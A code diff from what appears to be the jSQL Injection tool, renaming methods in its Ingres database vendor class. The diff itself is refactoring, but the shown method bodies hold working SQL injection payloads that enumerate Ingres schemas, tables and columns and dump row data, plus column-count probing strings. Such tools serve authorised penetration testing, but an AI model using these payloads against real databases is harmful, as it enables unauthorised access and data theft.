@@ -14,13 +14,13 @@ import com.jsql.util.StringUtil;
 public class IngresVendor extends AbstractVendorDefault {
 
     @Override
-    public String getSqlInfos() {
+    public String sqlInfos() {
         return
             "SELECT+dbmsinfo('_version')||'"+ SEPARATOR_SQL +"'||dbmsinfo('database')||'"+ SEPARATOR_SQL +"'||dbmsinfo('session_user')||0x01030307+r";
     }
 
     @Override
-    public String getSqlDatabases() {
+    public String sqlDatabases() {
         return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
@@ -29,7 +29,7 @@ public class IngresVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlTables(Database database) {
+    public String sqlTables(Database database) {
         return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
@@ -38,7 +38,7 @@ public class IngresVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlColumns(Table table) {
+    public String sqlColumns(Table table) {
         return
             "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +"'rr+" +
             "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
@@ -47,7 +47,7 @@ public class IngresVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlRows(String[] columns, Database database, Table table) {
+    public String sqlRows(String[] columns, Database database, Table table) {
         String formatListColumn = StringUtil.join(columns, "{%}");
         
         formatListColumn = formatListColumn.replace("{%}", "),''))||0x7f||trim(ifnull(varchar(");
@@ -61,13 +61,13 @@ public class IngresVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlNormal(String sqlQuery, String startPosition) {
+    public String sqlNormal(String sqlQuery, String startPosition) {
         return
             "'SQLi'||substr(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
     }
 
     @Override
-    public String getSqlCapacity(String[] indexes) {
+    public String sqlCapacity(String[] indexes) {
         return
             MediatorModel.model().getIndexesInUrl().replaceAll(
                 "1337(" + StringUtil.join(indexes, "|") + ")7331",
@@ -76,7 +76,7 @@ public class IngresVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlIndices(Integer nbFields) {
+    public String sqlIndices(Integer nbFields) {
         String replaceTag = "";
         List<String> fields = new ArrayList<>(); 
         for (int i = 1 ; i <= nbFields ; i++) {
@@ -87,12 +87,12 @@ public class IngresVendor extends AbstractVendorDefault {
     }
 
     @Override
-    public String getSqlOrderBy() {
+    public String sqlOrderBy() {
         return "+order+by+1337+";
     }
 
     @Override
-    public String getSqlLimit(Integer limitSQLResult) {
+    public String sqlLimit(Integer limitSQLResult) {
         return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
     }
 }
